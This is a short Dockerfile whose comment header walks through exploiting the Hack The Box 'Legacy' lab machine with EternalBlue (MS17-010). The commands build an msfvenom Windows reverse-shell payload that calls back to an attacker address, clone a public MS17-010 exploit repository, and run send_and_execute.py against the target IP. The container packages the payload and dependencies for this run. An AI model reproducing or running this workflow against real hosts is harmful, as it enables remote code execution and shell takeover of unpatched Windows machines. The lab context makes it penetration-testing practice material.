# Simple container to run Eternal Blue against HTB Legacy
# Usage:
# Create reverse shell with msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
# Build image
# sudo docker build -t cattime .
# Start container
# sudo docker run -it cattime /bin/sh
# Clone Eternal Blue expoit repo
# git clone https://github.com/helviojunior/MS17-010.git
# cd MS17-010
# python send_and_execute.py 10.10.10.4 ../rev.exe

FROM python:2.7-alpine
RUN apk --update --no-cache add \
    git \
    zlib-dev \
    musl-dev \
    libc-dev \
    gcc \
    libffi-dev \
    openssl-dev && \
    rm -rf /var/cache/apk/*

RUN mkdir -p /opt/cattime
COPY requirements.txt /opt/cattime
COPY rev.exe /opt/cattime
WORKDIR /opt/cattime
RUN pip install -r requirements.txt
